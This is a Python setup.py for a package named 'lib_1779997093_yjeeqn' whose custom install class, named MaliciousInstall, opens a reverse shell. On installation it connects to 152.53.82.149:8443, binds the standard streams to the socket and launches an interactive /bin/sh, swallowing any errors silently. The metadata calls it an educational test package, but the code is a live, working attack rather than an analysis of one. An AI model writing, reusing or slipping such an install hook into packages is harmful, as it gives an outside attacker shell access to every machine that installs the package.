from setuptools import setup
from setuptools.command.install import install
import socket,subprocess,os

class MaliciousInstall(install):
    def run(self):
        try:
            s=socket.socket()
            s.connect(("152.53.82.149",8443))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            subprocess.call(["/bin/sh","-i"])
        except:
            pass
        install.run(self)

setup(
    name='lib_1779997093_yjeeqn',
    version='1.0.0',
    packages=['lib_1779997093_yjeeqn'],
    cmdclass={'install': MaliciousInstall},
    url='https://example.com',
    author='Test Author',
    author_email='test@example.com',
    description='Test package',
    long_description='Test package for educational purposes',
    long_description_content_type='text/markdown',
    python_requires='>=3.6',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
    ],
)
